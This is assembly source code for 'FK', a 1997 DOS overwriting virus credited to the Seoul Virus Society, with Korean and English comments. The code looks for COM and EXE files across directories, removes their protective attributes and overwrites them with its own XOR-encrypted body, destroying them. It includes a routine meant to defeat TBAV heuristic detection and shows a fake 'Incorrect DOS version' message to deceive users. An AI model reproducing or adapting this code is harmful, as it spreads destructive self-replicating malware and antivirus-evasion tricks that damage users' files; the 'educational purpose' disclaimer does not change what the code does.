;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;           FK                                \          \     \   \
;                      by MOV / SVS           \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #01
; Virus Name : FK
; Author     : MOV (Master Of Virus)
; Group      : SVS (Seoul Virus Society)
; Origin     : Corea
; Date       : 1997/10/29
;
; Type : Non-memory resident  COM  Overwriting
;
; !****************************************************************************!
; *                                                                            *
; * 경고 !                                                                     *
; *    이것은 바이러스 소스 코드이다. 교육적인 목적으로만 사용되어야한다.      *
; *    제작자는 이 소스코드로 야기되는 어떠한 문제에 대해서도 책임을 지지 않   *
; *    는다. 변형 하거나 실행하지 마라 !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify & execute it !                                        *
; *                                                                            *
; !****************************************************************************!
;
;  본 바이러스는 서울바이러스연합 SVS (Seoul Virus Society) 의 새로운 멤버인 MOV
;  (Master Of Virus)가 제작한 FK 바이러스의 소스이다. 제작자의 원본 소스로 추정
;  된다.
;
;  TBAV 에 대해 Anti-heuristic 루틴이 들어있다. TBAV 로 진단했을때 '#' 표시가
;  나타나지 않는다.
;
;  국내에도 TBAV 사용자가 많은 점을 생각하면 꽤 좋은 방법이다.
;
;  여러가지 바이러스 소스를 혼합한 듯한 인상이 든다.
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

virus     segment para 'virus'
          assume  cs:virus,ds:virus

          org 100h

start:    nop
          jmp vstart                    ; 바이러스 시작
msg:    
szolddir  db '\'                        ;
sdta      db 64 dup (?)                 ; 버퍼
szall     db '*.*',0                    ; 모든 파일 찾기
szrtdir   db '\',0                      ;
szptdir   db '..',0                     ; 상위 이동
dir_buff  db 64 dup (?)                 ; 버퍼
comfiles  db '*.c?m',0                  ; COM 파일 찾기
exefiles  db '*.e?e',0                  ; EXE 파일 찾기
pdirlevel dw offset sdirlevel           ;
sdirlevel db 40h dup (1)                ;
pcurfile  dw ?                          ;

bmsg      db 'Incorrect DOS version',0ah,0dh,'$'

vmsg      db '(c) Copyleft 1997 10.29 by SVS/COREA',0ah,0dh
          db '[F.K Virus].MOV(Master Of Virus)',0ah,0dh,'$'
msge:
vstart:   call plp                          ; Anti-herusitic
          call pass                         ; 암호화
          mov ax,5700h                      ; 왜 ????????????
          int 21h                           ; bug ?
          push cx                           ;
          push dx                           ;
          xor ax,ax
          mov es,ax
          mov al,byte ptr es:[046ch]        ; 암호 키값 얻기
          push cs
          pop es
          mov key,al                        ;
          jmp daad
DAAD:             
          mov ah,4eh                        ; EXE 파일 찾기 (E?E)
          mov dx,offset exefiles
          int 21h
          jmp adca

plp:      cmp al,100                        ;
          je  reee                          ; TBAV '#' flag 무력화
          inc al                            ;
          loop plp                          ;
reee:     ret                               ;

ADCA:     jc  axc                           ; 찾기 실패 ?

          mov ax,4301h                      ; 읽기/쓰기로 속성 변경
          xor cx,cx
          mov dx,80h+1eh
          int 21h
          mov ax,3d02h                      ; 파일 오픈
          int 21h
          xchg bx,ax
          call pass                         ; 암호화
          mov ah,40h                        ; 바이러스 쓰기
          mov dx,100h
          mov cx,offset endd - 100h
          int 21h
          call pass                         ; 암호 해제

AXC:      mov ah,2ah
          int 21h
          cmp dl,31                         ; 31 일 ?
          je  vmsgg
          jmp dabb
vmsgg:    mov ah,9                          ; 사용자를 속이기 위한 메시지 출력
          mov dx,offset vmsg                ;
          int 21h                           ;
          call pass
          call pass
          int 20h                           ; 바이러스 종료

DABB:     xor ax,ax                         ; DTA 설정
          xor bx,bx
          xor cx,cx
          xor dx,dx
          mov ah,1ah
          mov dx,offset sdta
          int 21h

DDD:      mov ah,47h                        ;
          mov dl,0
          mov si,offset dir_buff
          int 21h

          mov ah,3bh                        ; 디렉토리 이동
          mov dx,offset szrtdir
          int 21h
          jmp find1st

find1st:  mov ah,4eh                        ; COM 파일 찾기
DA:       mov cx,0
          mov dx,offset comfiles
          int 21h
          jc chdir
          mov pcurfile, offset sdta + 1eh
          mov dx,pcurfile
          call vir                          ;
          jc   exitcf
          jmp findnext

findnext: 
          mov ah,4fh                        ; 다음 파일 찾기
          jmp da

chdir:    mov si,pdirlevel
finddir:  xor bl,bl
          mov ah,4eh
          mov cx,10010b
          mov dx,offset szall
          int 21h
          jc chkrtdir
          jmp chkdir

findnext2:
          ret

nextdir:  mov ah,4fh
          int 21h
          jc chkrtdir
chkdir:   cmp byte ptr sdta[15h], 10000b    ; 디렉토리 인지 검사
          jz lscurdir
          cmp byte ptr sdta[15h], 10010b
          jnz nextdir
lscurdir: cmp byte ptr sdta[1eh], '.'       ; .. 인가 ?
          jz nextdir
          inc bl
          cmp bl,[si]
          jnz nextdir

          mov ah,3bh                        ; 해당 디렉토리로 이동
          mov dx,offset sdta + 1eh
          int 21h
          inc byte ptr [si]
          inc si
          mov pdirlevel, si
          jmp find1st

chkrtdir: cmp si,offset sdirlevel
          je exitcf
          mov ah,3bh
          mov dx,offset szptdir
          int 21h
          mov byte ptr [si], 1
          dec si
          jmp finddir

exitcf:   mov ah,3bh
          mov dx,offset szptdir
          int 21h
          mov ah,3bh
          mov dx,offset dir_buff
          int 21h
          mov ah,9
          mov dx,offset bmsg
          int 21h
          int 20h

pass:     mov si,offset msg             ; 암호화 루틴
          mov di,si
          mov ah,key
          mov cx,offset msge - msg
ploop:    lodsb
          xor al,ah
          stosb
          loop ploop
          ret
          
key       db ?                          ; 키 값
vir:      
          push dx
          mov ax,4301h
          xor cx,cx
          mov dx,offset sdta + 1eh
          int 21h
          mov ax,3d02h
          int 21h
          xchg bx,ax
          call pass
          mov ah,40h
          mov dx,100h
          mov cx,offset endd - 100h
          int 21h
          call pass
          pop dx
          ret

ENDD:

 virus    ends
          end start
